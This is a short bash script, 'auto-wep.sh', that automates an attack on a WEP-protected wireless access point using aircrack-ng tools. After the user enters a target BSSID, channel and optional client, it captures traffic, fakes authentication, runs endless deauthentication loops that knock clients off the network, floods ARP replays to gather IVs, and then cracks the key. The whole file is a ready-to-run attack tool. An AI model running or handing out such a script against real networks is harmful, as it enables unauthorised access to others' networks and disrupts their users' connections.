#!/bin/bash
##  
### auto-wep.sh - automatic wep-cracking(run as root)
##
#
export IFACE
export BSSID
export CHANNEL
export CLIENT # target for deauth. (optional)

### Check for argument
if [ -z $1 ] 
  then echo "Usage: $0 <interface>"
  echo "Set MONITOR mode interface. use airmon-ng start <interface> and try again."
  exit
fi

### Check for xterm and aircrack-ng(dependencies)
if [ -z `which xterm` ]
  then echo "Xterm is not installed. Install it and try again."
  exit
fi

if [ -z `which aircrack-ng` ]
  then echo "Aircrack-ng is not installed. Install it and try again."
  exit
fi

### Start airodump-ng to collect target information
IFACE=$1
sudo airodump-ng $IFACE
echo "### TARGET INFORMATION ###"
echo "Enter BSSID: "; read BSSID
echo "Enter AP Channel: "; read CHANNEL
echo "Enter client(optional): "; read CLIENT
echo "Starting $0 with these parameters: "
echo "   Interface: $IFACE"; sleep 1
echo "       BSSID: $BSSID"; sleep 1
echo "     Channel: $CHANNEL"; sleep 1

if [ "$CLIENT" != "" ]
  then echo "      Client: $CLIENT"; sleep 1
fi

### Start wep cracking process using components of aircrack-ng in the background (&)
# Start airodump-ng
xterm -e "sudo airodump-ng --bssid $BSSID --channel $CHANNEL -w AUTO-WEP $IFACE" &

# Start aireplay-ng for fake auth. 
sleep 5
xterm -e "sudo aireplay-ng -1 0 $IFACE -a $BSSID" &


# Wait for fake association before deauth.
sleep 5

if [ "$CLIENT" != "" ]
  then xterm -e "while true; do sudo aireplay-ng -0 6 $IFACE -a $BSSID -c $CLIENT; sleep 5; done" &
fi

if [ "$CLIENT" = "" ]
  then xterm -e "while true; do sudo aireplay-ng -0 6 $IFACE -a $BSSID; sleep 5; done" &
fi

# Start aireplay-ng for ARP replay
xterm -e "sudo aireplay-ng -3 $IFACE -b $BSSID" &

# Start cracking .cap file after giving some time to generate initialization vectors(iv's)
sleep 60
sudo aircrack-ng AUTO-WEP*.cap
